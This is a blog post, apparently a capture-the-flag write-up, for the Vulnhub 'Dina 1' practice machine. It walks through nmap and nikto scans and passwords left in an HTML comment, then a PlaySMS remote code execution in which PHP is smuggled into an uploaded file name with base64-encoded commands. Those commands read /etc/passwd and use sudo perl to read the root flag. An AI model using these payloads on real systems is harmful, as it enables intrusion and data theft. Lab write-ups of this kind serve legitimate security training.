---
layout:     post
title:      "Vulnhub.com - Dina 1"
date:       2017-11-18 8:00:00
author:     "W3ndige"
permalink: /:title/
category: Vulnhub
---

Let's quickly jump into another machine from Vulnhub called **Dina**.

{% highlight text %}
Welcome to Dina 1.0.1

________                                                _________
\________\--------___       ___         ____----------/_________/
    \_______\----\\\\\\   //_ _ \\    //////-------/________/
        \______\----\\|| (( ~|~ )))  ||//------/________/
            \_____\---\\ ((\ = / ))) //----/_____/
                 \____\--\_)))  \ _)))---/____/
                       \__/  (((     (((_/
                          |  -)))  -  ))

This is my first Boot2Root - CTF VM. I hope you enjoy it.

if you run into any issue you can find me on Twitter: @touhidshaikh22

Contact: touhidshaikh22 at gmaill.com <- Feel Free to write mail

Website: http://www.touhidshaikh.com

Goal: /root/flag.txt

Level: Beginner (IF YOU STUCK ANYwhere PM me for HINT, But I don't think need any help).

Download: https://drive.google.com/file/d/0B1qWCgvhnTXgNUF6Rlp0c3Rlb0k/view

Try harder!: If you are confused or frustrated don't forget that enumeration is the key!

Feedback: This is my first boot2root - CTF Virtual Machine, please give me feedback on how to improve!

Tested: This VM was tested with:
{% endhighlight %}

<p>Author: <a href="https://www.vulnhub.com/author/touhid-shaikh,465/"><b>Touhid Shaikh</b></a></p>
<p>Download: <a href="https://drive.google.com/file/d/0B1qWCgvhnTXgNUF6Rlp0c3Rlb0k/view"><b>Dina</b></a></p>

# Write-Up

Let's begin by enumerating the ports using **nmap**.

{% highlight bash %}
root@kali:~#  nmap -p- -v -sS -A -T4 10.0.2.5

Starting Nmap 7.60 ( https://nmap.org ) at 2017-11-18 08:55 EST
NSE: Loaded 146 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 08:55
Completed NSE at 08:55, 0.00s elapsed
Initiating NSE at 08:55
Completed NSE at 08:55, 0.00s elapsed
Initiating ARP Ping Scan at 08:55
Scanning 10.0.2.5 [1 port]
Completed ARP Ping Scan at 08:55, 0.22s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:55
Completed Parallel DNS resolution of 1 host. at 08:55, 0.00s elapsed
Initiating SYN Stealth Scan at 08:55
Scanning 10.0.2.5 [65535 ports]
Discovered open port 80/tcp on 10.0.2.5
Increasing send delay for 10.0.2.5 from 0 to 5 due to max_successful_tryno increase to 5
Increasing send delay for 10.0.2.5 from 5 to 10 due to 24 out of 59 dropped probes since last increase.
SYN Stealth Scan Timing: About 9.80% done; ETC: 09:01 (0:04:45 remaining)
SYN Stealth Scan Timing: About 11.72% done; ETC: 09:04 (0:07:40 remaining)
SYN Stealth Scan Timing: About 14.98% done; ETC: 09:05 (0:08:36 remaining)
SYN Stealth Scan Timing: About 16.87% done; ETC: 09:07 (0:09:56 remaining)
SYN Stealth Scan Timing: About 18.59% done; ETC: 09:09 (0:11:01 remaining)
SYN Stealth Scan Timing: About 20.50% done; ETC: 09:10 (0:11:42 remaining)
Warning: 10.0.2.5 giving up on port because retransmission cap hit (6).
SYN Stealth Scan Timing: About 23.70% done; ETC: 09:12 (0:12:27 remaining)
SYN Stealth Scan Timing: About 45.90% done; ETC: 09:17 (0:11:38 remaining)
SYN Stealth Scan Timing: About 51.99% done; ETC: 09:17 (0:10:33 remaining)
SYN Stealth Scan Timing: About 57.71% done; ETC: 09:18 (0:09:26 remaining)
SYN Stealth Scan Timing: About 63.26% done; ETC: 09:18 (0:08:19 remaining)
SYN Stealth Scan Timing: About 68.64% done; ETC: 09:18 (0:07:11 remaining)
SYN Stealth Scan Timing: About 74.03% done; ETC: 09:19 (0:06:01 remaining)
SYN Stealth Scan Timing: About 79.24% done; ETC: 09:19 (0:04:51 remaining)
SYN Stealth Scan Timing: About 84.50% done; ETC: 09:19 (0:03:40 remaining)
SYN Stealth Scan Timing: About 89.77% done; ETC: 09:19 (0:02:27 remaining)
SYN Stealth Scan Timing: About 94.92% done; ETC: 09:19 (0:01:13 remaining)
Completed SYN Stealth Scan at 09:23, 1665.92s elapsed (65535 total ports)
Initiating Service scan at 09:23
Scanning 1 service on 10.0.2.5
Completed Service scan at 09:23, 6.04s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 10.0.2.5
adjust_timeouts2: packet supposedly had rtt of -175605 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -175605 microseconds.  Ignoring time.
NSE: Script scanning 10.0.2.5.
Initiating NSE at 09:23
Completed NSE at 09:23, 0.10s elapsed
Initiating NSE at 09:23
Completed NSE at 09:23, 0.00s elapsed
Nmap scan report for 10.0.2.5
Host is up (0.00059s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 5 disallowed entries
|_/ange1 /angel1 /nothing /tmp /uploads
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Dina
MAC Address: 08:00:27:3A:EC:D6 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Uptime guess: 0.023 days (since Sat Nov 18 08:51:09 2017)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=250 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   0.59 ms 10.0.2.5

NSE: Script Post-scanning.
Initiating NSE at 09:23
Completed NSE at 09:23, 0.00s elapsed
Initiating NSE at 09:23
Completed NSE at 09:23, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1675.39 seconds
           Raw packets sent: 127751 (5.623MB) | Rcvd: 137025 (7.230MB)
{% endhighlight %}

As you can see, the only service that's open is **http**. With that information, we can navigate to it with our browser.

![Main Website](/img/dina/main_web.png){:class="img-responsive center-block"}

While looking for clues manually, I decided to run a **nikto** scan to find some low hanging fruit.

{% highlight bash %}
root@kali:~# nikto -h 10.0.2.5
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.5
+ Target Hostname:    10.0.2.5
+ Target Port:        80
+ Start Time:         2017-11-18 08:57:45 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, inode: 425463, size: 3618, mtime: Tue Oct 17 09:46:52 2017
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OSVDB-3268: /ange1/: Directory indexing found.
+ Entry '/ange1/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ OSVDB-3268: /angel1/: Directory indexing found.
+ Entry '/angel1/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ OSVDB-3268: /tmp/: Directory indexing found.
+ Entry '/tmp/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ OSVDB-3268: /uploads/: Directory indexing found.
+ Entry '/uploads/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 5 entries which should be manually viewed.
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3268: /secure/: Directory indexing found.
+ OSVDB-3092: /tmp/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8351 requests: 0 error(s) and 20 item(s) reported on remote host
+ End Time:           2017-11-18 08:58:10 (GMT-5) (25 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
{% endhighlight %}

And there it is, in **secure** directory there is a **backup** file.

{% highlight text %}
http://10.0.2.5/secure/
backup.zip
{% endhighlight %}

Unfortuntely, it's password protected, so let's keep it in mind and look for some more clues.

{% highlight bash %}
root@kali:~/Downloads# 7z x backup.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=C.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-2410M CPU @ 2.30GHz (206A7),ASM)

Scanning the drive for archives:
1 file, 336 bytes (1 KiB)

Extracting archive: backup.zip
--
Path = backup.zip
Type = zip
Physical Size = 336


Enter password (will not be echoed):
ERROR: Wrong password : backup-cred.mp3

Sub items Errors: 1

Archives with Errors: 1

Sub items Errors: 1
{% endhighlight %}

Here's the content of **robots.txt**, makes it better to scan one by one.  

{% highlight text %}
User-agent: *
Disallow: /ange1
Disallow: /angel1
Disallow: /nothing
Disallow: /tmp
Disallow: /uploads
{% endhighlight%}

While every other directory is empty, there is a hidden comment in one called **/nothing**.

{% highlight html %}
<html>
<head><title>404 NOT FOUND</title></head>
<body>
<!--
#my secret pass
freedom
password
helloworld!
diana
iloveroot
-->
<h1>NOT FOUND</html>
<h3>go back</h3>
</body>
</html>
{% endhighlight%}

List of passwords, which we can now use to extract the contents of the backup. Luckily, first one already works - **freedom**.

{% highlight bash %}
root@kali:~/Downloads# 7z x backup.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=C.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-2410M CPU @ 2.30GHz (206A7),ASM)

Scanning the drive for archives:
1 file, 336 bytes (1 KiB)

Extracting archive: backup.zip
--
Path = backup.zip
Type = zip
Physical Size = 336


Would you like to replace the existing file:
  Path:     ./backup-cred.mp3
  Size:     0 bytes
  Modified: 2017-10-17 08:27:49
with the file from archive:
  Path:     backup-cred.mp3
  Size:     176 bytes (1 KiB)
  Modified: 2017-10-17 08:27:49
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? Y


Enter password (will not be echoed):
Everything is Ok      

Size:       176
Compressed: 336
{% endhighlight %}

Now we can take a closer look at the file.

{% highlight bash %}
root@kali:~/Downloads# file backup-cred.mp3
backup-cred.mp3: ASCII text
root@kali:~/Downloads# cat backup-cred.mp3

I am not toooo smart in computer .......dat the resoan i always choose easy password...with creds backup file....

uname: touhid
password: ******


url : /SecreTSMSgatwayLogin
{% endhighlight %}

Great! As simple as it is, we get another clue. Let's take a look at the provided directory.

![Secret SMS](/img/dina/secret-sms.png){:class="img-responsive center-block"}

As we already have a username, the best way to get into the website is to try passwords from the previously provided list. This time it's **diana**.

![Secret SMS Logged](/img/dina/secret-sms-logged.png){:class="img-responsive center-block"}

And after doing a little bit of enumeration, I've found exploit available for this service. [PlaySMS Remote Code Execution](https://www.exploit-db.com/exploits/42003/ "PlaySMS Remote Code Execution"), which we can use to attack our target.

{% highlight text %}
http://10.0.2.5/SecreTSMSgatwayLogin/index.php?app=main&inc=feature_sendfromfile&op=list
{% endhighlight %}

In order to run commands, we have to create a file with **php** command in title, just like this example.

{% highlight bash %}
touch "<?php system('uname -a'); dia();?>.php"
Uploaded file: Linux Dina 3.2.0-23-generic-pae #36-Ubuntu SMP Tue Apr 10 22:19:09 UTC 2012 i686 i686 i386 GNU/Linux
{% endhighlight %}

It's working! But there's one problem - names of our files cannot contain **/** characters, as they're restriced by the filesystem. One workaround would be to encode the command with **base64** and then decode the string through php function.

{% highlight bash %}
root@kali:~/Downloads# echo "cat /etc/passwd" | base64
Y2F0IC9ldGMvcGFzc3dkCg==
touch "<?php system(base64_decode('Y2F0IC9ldGMvcGFzc3dkCg==')); dia();?>.php"
{% endhighlight %}

Will it work?

{% highlight text %}
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
colord:x:103:108:colord colour management daemon,,,:/var/lib/colord:/bin/false
lightdm:x:104:111:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:105:114::/nonexistent:/bin/false
avahi-autoipd:x:106:117:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:107:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
usbmux:x:108:46:usbmux daemon,,,:/home/usbmux:/bin/false
kernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:110:119:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:111:122:RealtimeKit,,,:/proc:/bin/false
speech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false
saned:x:114:123::/home/saned:/bin/false
touhid:x:1000:1000:touhid,,,:/home/touhid:/bin/bash
mysql:x:115:125:MySQL Server,,,:/nonexistent:/bin/false
{% endhighlight %}

Yes! Now we have to find a way to get to the flag. From numerous times, I remember to start from easiest things, which is checking **sudo -l** command.

{% highlight bash %}
Uploaded file: Matching Defaults entries for www-data on this host:
    env_reset,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on this host:
    (ALL) NOPASSWD: /usr/bin/perl
{% endhighlight %}

Hmm, we can run **perl** commands with root permissions. Let's try to use it and read the contents of the flag.

{% highlight bash %}
root@kali:~# echo "sudo perl-e 'exec(\"cat /root/flag.txt\")'" | base64
c3VkbyBwZXJsLWUgJ2V4ZWMoImNhdCAvcm9vdC9mbGFnLnR4dCIpJwo=

{% endhighlight %}

Now it's time to upload it.

{% highlight bash %}
<?php system(base64_decode('c3VkbyBwZXJsIC1lICdleGVjKCJjYXQgL3Jvb3QvZmxhZy50eHQiKScK')); dia();?>.php
Uploaded file: ________                                                _________
\________\--------___       ___         ____----------/_________/
    \_______\----\\\\\\   //_ _ \\    //////-------/________/
        \______\----\\|| (( ~|~ )))  ||//------/________/
            \_____\---\\ ((\ = / ))) //----/_____/
                 \____\--\_)))  \ _)))---/____/
                       \__/  (((     (((_/
                          |  -)))  -  ))


root password is : hello@3210
easy one .....but hard to guess.....
but i think u dont need root password......
u already have root shelll....


CONGO.........
FLAG : 22d06624cd604a0626eb5a2992a6f2e6
{% endhighlight %}

Our goal was to get the flag, so the job is done here, but reverse shell would be very easy to implement from this step.
